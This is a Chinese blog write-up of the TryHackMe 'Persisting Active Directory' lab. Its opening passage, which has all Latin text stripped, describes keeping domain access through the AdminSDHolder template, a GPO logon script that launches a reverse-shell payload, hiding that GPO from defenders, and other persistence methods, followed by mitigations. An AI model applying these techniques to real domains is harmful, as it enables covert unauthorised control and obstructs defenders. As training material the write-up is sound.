器不通过的方法即使用上述注入命令所启动的完成上述操作后大概等待一分钟左右然后继续使用上文中的控制台检查受保护组如组的安全权限我们可以看到我们的低权限用户对于组具有完全控制权限我们可以从组的安全权限属性中删除低权限用户并重新运行脚本来验证我们之前所修改的模版组的将继续传播而且我们的低权限用户将会被再次添加到组的中有趣的是虽然我们有权限修改组但是它并不会自动将我们的低权限用户例如添加到组成员列表中我们可以使用我们所被分配的新权限将对应的低权限用户例如作为组成员添加到组中然后验证低权限用户的可用特权这里不知道为何验证不成功成功实例我的示例在手动启动进程之后我们也可以通过之前的界面用于低权限用户访问跳板主机的见上文执行命令来向受保护组例如组手动添加组成员上述的方法我依旧不成功蓝队正在走下坡路我们可以将本小节的权限维持技术与上一小节中的组嵌套技术结合起来即使蓝队通过更改大量的组撤销了我们所获得的访问权限但是在分钟后我们仍然可以重新被自动分配权限除非蓝队知道我们所获得的权限是通过修改组而来的否则蓝队每隔分钟就会感到头疼由于这种权限维持是通过合法的服务来传播实现的因此每次发生上述自动分配权限的情况时蓝队都难以找到真正的问题所在我们还可以将完全控制权限授予模版组中的域用户组这意味着任何低权限用户都将被授予对于所有的受保护组的完全控制权限此外我们还可以将此项技术与完整的同步攻击相结合这意味着蓝队还需要重置目标域中的每个凭据以尝试彻底清除我们所获得的权限通过实现持久化即组策略对象它可以被用于帮助我们执行枚举攻击或者利用等技术同时它也可以被用于实现域权限维持域中的组策略管理能够提供一种集中的机制来管理所有域内机器的本地策略配置包括对受限制组的成员关系防火墙程序反病毒程序等功能的配置以及配置主机启动时应该执行哪些脚本虽然是一个很好的管理工具但是攻击者也可能会针对以便在目标域中实现权限维持更糟糕的是攻击者还可以隐藏恶意的以至于蓝队难以将恶意的删除介绍以下是一些常见的基于的权限维持技术配置受限制组的成员关系这将允许我们以管理并访问域内的所有主机部署登录脚本这将确保每次用户对域中的主机进行身份验证时如用户的登录操作我们都会得到一个回调我们在本小节中会重点关注上述第二种权限维持技术虽然能够访问所有域内主机是件好事但是如果能够确保我们以管理员权限来访问这些主机那就更好了为此我们将创建一个链接到组织单元的这将允许我们在用户每次对域内主机进行身份验证时能够获得相关的前期准备工作在我们创建之前我们首先需要生成文件设置端口侦听器以及编写能够执行的文件我们可以使用以下命令来生成一个可执行的文件接下来我们还需要创建一个批处理脚本此脚本会在用户登录主机时在目标系统上运行该脚本将执行以下操作将有效载荷文件即上面所生成的文件从域控制器上的目录复制到用户的计算机上的临时目录下等待秒并完成文件的复制执行有效载荷文件生成反向脚本的内容如下所示在攻击机上创建一个脚本内容如下所示允许我们通过登录执行批处理或脚本但是批处理脚本通常比脚本更稳定我们可以使用命令以及上文所提供的用户凭据将上述两个文件上传到目标的目录中在攻击机上操作用户名密码最后我们还需要在攻击机上设置端口侦听器创建现在我们的准备工作已经完成接下来我们需要创建我们将通过连接到跳板主机并使用命令注入管理员凭据以启动控制台这部分内容可以参考上一小节的操作步骤在攻击机上另启一个终端用户名密码在控制台中选择并添加组策略管理单元这里我点击之后总是报错说是不能联系上对应的控制器这里没办法我就直接照搬看思路了在本小节中我们将编写一个会被应用到所有管理员的我们先右键点击中的然后选择在当前域中创建以完成链接我们可以指定一个名称给我们所创建的如从技术上讲我们也可以将恶意内容写入上图中的默认域策略该策略能够被传播给所有的对象右键单击我们所创建的并选择强制执行这将确保我们的策略被应用即使存在策略冲突这也能让我们的策略更加优先右键单击上述恶意策略并选择编辑在用户配置下展开选择右键单击选择选项卡单击导航到我们存储文件以及批处理文件的目录我们选择批处理文件作为脚本并点击打开和确认选项然后继续点击应用和确认这将确保每次管理员组中的成员登录到任何计算机时我们都会在攻击机上收到一个反向回调我们将通过模拟管理员用户登录来完成刚才所提及的回调过程为此我们将重置属于管理员组的某个用户的密码以便我们使用密码模拟登录我们仍然需要使用上述的控制台但是这次我们将添加管理单元选择一个管理员用户并右键单击然后选择重置密码注意我们需要为上述恶意创建一个登录事件所以我们还需要确保注销我们上文中用于创建恶意的会话注销过程将如下所示现在让我们使用已经修改了密码的管理员用户身份通过访问目标机器这将触发登录事件使用我们所设置的新密码进行登录然后我们将在攻击机上的端口监听器上接收到一个反向连接隐藏我们不希望蓝队能够修改或删除我们所创建的恶意这会破坏我们所建立的持久性权限因此我们可以在跳板主机上打开控制台并尝试隐藏我们刚才所创建的单击委派选项卡在默认情况下所有管理员都可以编辑我们上文所创建的所以让我们删除这些权限右键单击企业域控制器然后选择单击所有其他组经过身份验证的用户除外然后单击删除最后的委派内容将如下所示单击恶意的安全设置中的高级选项并从权限中删除在默认情况下所有通过身份验证的用户都必须具有读取策略的权限否则当用户进行身份验证以应用用户策略时将无法读取策略如果我们没有部署登录脚本我们就可以尝试删除此权限以确保几乎没有人能够读取我们的策略接下来我们可以将替换成以确保计算机可以读取和应用我们的恶意策略但是同时我们还要阻止任何用户去读取恶意策略我们需要提前测试一下反向回调能够正常进行因为我们接下来的操作会使得用户无法读取脚本在恶意的安全设置中单击添加输入然后点击并继续点击选择并确认点击选中并进行删除执行上次步骤之后我们将立即收到一个错误提示告诉我们无法再读取策略通过执行上述操作我们可以确保蓝队无法轻易删除我们所创建的恶意除非他们选择模拟域控制器的计算机帐户总结我们可以通过几种不同的方式来实现域权限维持其中的一些技术会比其他技术更加具有隐蔽性和有效性为了确保我们所执行的权限维持设置不会被蓝队移除我们必须创造性地思考怎么进行权限维持此外我们不应该等到整个目标域都被渗透之后再考虑进行权限维持实际上在每一轮的横向移动和权限提升操作之后我们就应该尝试进行域权限维持其他域权限维持技术在本文的实验网络环境中我们介绍了几种可用于在域中实现权限维持的技术但是我们目前所介绍的权限维持技术绝不是一个详尽的清单下面是其他一些值得被提及的域权限维持技术使用我们可以部署万能钥匙该万能钥匙可用于模拟模板域中的任何帐户会创建一个默认密码并将其适用于目标域中的任何帐户但是原先的普通密码仍然有效因此防御者很难知道这种攻击已经发生每个域控制器中都有一个被称为的内部可用的管理员帐户帐户的密码将在服务器升级为时设置并且很少会发生修改该密码能够用于在紧急情况下恢复而攻击者可以使用来提取帐户的密码并使用此密码获得针对目标环境中的域控制器的管理及访问权限利用接口我们可以将的添加为新的这会将目标域中的所有身份验证尝试的凭据都记录到一个日志文件中我们可以指定用于日志记录的网络位置这将允许把我们的凭据发送给被入侵的域内主机并进行身份验证从而为我们提供持久化的访问权限机器计算机帐户的密码通常会每天轮换一次但是我们可以更改机器帐户的密码设置让它停止自动轮换除此之外我们还可以授予机器帐户对于其他域内主机的管理及访问权限这将允许我们将计算机帐户作为域内的其他帐户使用我们只需要尝试让该帐户对其他主机也具有管理权限即可而且这在域中通常是正常的行为因此相关操作可能不会被蓝队认为是恶意行为我们还应该注意到本文的重点是域中的权限维持技术而本地权限维持技术仅允许攻击者在目标主机上实现权限持久化但是如果这些目标主机是在目标域内的那么我们也可以通过本地权限维持来实现针对目标域的权限维持缓解域权限维持威胁的措施蓝队应该如何防御这些针对域的权限维持技术呢在某些情况下攻击者所执行的权限维持设置可能根深蒂固以至于蓝队需要重新构建完整的域才能够完全清理权限维持设置在通常情况下蓝队可以通过以下操作来检测由攻击者所部署的权限维持设置检测异常帐户的登录事件当域的分层模型被用户凭据所破坏时则可能是攻击者使用了域权限维持技术的结果对于上文所提到的每一种域权限维持技术蓝队都可以编写特定的检测规则例如蓝队可以检测机器帐户的密码更改被允许更新的是否创建了新的等用于对抗域权限维持的最佳方法是保护特权资源尽管攻击者可以使用低特权访问权限来部署域权限维持设置但是真正可怕的域权限维持技术只有在攻击者获得针对目标域的高级访问特权后才可以被使用本文只是一个简单的技术介绍关于域的安全性我们还有很多地方需要学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-09 15:30:24',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Persisting Active Directory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-19T08:44:35.051Z" title="发表于 2024-02-19 16:44:35">2024-02-19</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-06-09T07:30:24.441Z" title="更新于 2024-06-09 15:30:24">2024-06-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">18.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>69分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Persisting Active Directory"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/19/thm-persisting-active-directory/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/19/thm-persisting-active-directory/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Persisting Active Directory</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-19T08:44:35.051Z" title="发表于 2024-02-19 16:44:35">2024-02-19</time><time itemprop="dateCreated datePublished" datetime="2024-06-09T07:30:24.441Z" title="更新于 2024-06-09 15:30:24">2024-06-09</time></header><h1 id="0x01-简介">0x01 简介</h1>
<p>该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD 中持久化的几种不同方法。</p>
<h2 id="ad-维持">AD 维持</h2>
<p>在攻击 AD 的过程中，我们需要确保部署持久性。这将确保蓝队无法通过简单地轮换一些凭证来将我们踢出局。如前所述，AD 的破坏过程是循环的。当我们损害 AD 财产时，我们会部署持久性，而不仅仅是在最后。这确保了如果我们的一个位置被蓝队烧毁，我们有几个后备方案。在此持久阶段，我们将使用多种技术来确保我们获得的访问权限不会被简单地撤销。这些持久性技术取决于我们迄今为止获得的特定权限和特权。</p>
<h2 id="学习目标">学习目标</h2>
<p>在这个网络中，我们将介绍几种可用于在 AD 中持久化的方法。这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。但是，我们将介绍以下持久 AD 技术：</p>
<ul>
<li>AD 凭据和 DCSync-ing</li>
<li>银票和金票</li>
<li>AD Certificates</li>
<li>AD 安全标识符 (SID)</li>
<li>Access Control Lists 访问控制列表</li>
<li>组策略对象 (GPO)</li>
</ul>
<h2 id="索取您的凭证">索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.loc/creds">http://distributor.za.tryhackme.loc/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
